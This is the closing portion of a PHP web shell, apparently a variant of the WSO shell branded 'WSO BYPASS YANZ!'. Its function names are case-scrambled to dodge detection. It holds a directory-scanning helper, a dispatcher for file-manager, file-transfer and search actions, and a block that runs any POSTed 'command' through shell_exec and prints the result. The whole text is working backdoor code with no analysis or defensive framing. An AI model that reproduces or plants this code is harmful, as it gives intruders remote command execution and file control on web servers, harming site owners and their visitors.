        return "<font color=#25ff00>" . wpeRmS(FiLepERmS($_rb)) . "</font>";
    }
}
function wScanDIR($_pa, $_u = "uvxf")
{
    if (funCTion_exISTs("scandir")) {
        return @ScAnDIr($_pa);
    } else {
        if ($_hcf = @oPENDIr($_pa)) {
            while (false !== ($_nm = @reAdDIR($_hcf))) {
                $_vgl[] = $_nm;
            }
            @ClOseDIr($_hcf);
        }
        return $_vgl;
    }
}
$_tcn = new _pps();
$_tcn->AFTErlOGin();
$_tcn->STaRtup();
if (@isset($_POST["a"])) {
    switch ($_POST["a"]) {
        case "fm":
            $_tcn->WheADer();
            $_tcn->acTfm();
            $_tcn->wfOoter();
            break;
        case "ft":
            if (@isset($_POST["x"]) && $_POST["x"] == "download") {
                $_tcn->aCtFT();
            } else {
                $_tcn->wHeADeR();
                $_tcn->aCTFT();
                $_tcn->wfoOteR();
            }
            break;
        case "sr":
            $_tcn->WhEAdEr();
            $_tcn->aCtSr();
            $_tcn->wfOOTer();
            break;
        case "Logout":
            $_tcn->actLoGoUT();
            break;
        default:
            $_tcn->WHeaDer();
            $_tcn->ActfM();
            $_tcn->WFOOtEr();
            break;
    }
} elseif (!@isset($_POST["a"])) {
    $_tcn->WHeAdER();
    $_tcn->AcTfm();
    $_tcn->WfOOTER();
    if (isset($_POST['subcmd'])) {
        echo "<pre class='text-white'>";
        $input = $_POST['command'];
        $output = shell_exec($input);
        echo "<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>";
        echo "<center>WSO BYPASS YANZ!</center>";
        echo "<br>";
        echo '$WSOYanZ: ';
        echo $output;
        echo "</pre>";
        exit;
    }
}"));
?>